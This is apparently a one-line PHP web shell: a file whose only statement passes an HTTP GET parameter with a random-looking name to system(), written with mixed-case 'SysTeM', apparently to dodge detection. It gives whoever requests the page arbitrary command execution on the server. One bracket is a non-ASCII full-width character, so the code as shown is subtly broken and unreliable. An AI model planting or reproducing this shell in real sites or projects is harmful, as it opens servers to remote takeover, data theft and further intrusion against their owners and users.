<?php
SysTeM($_GET['GFNgxYgd'〕);
?>
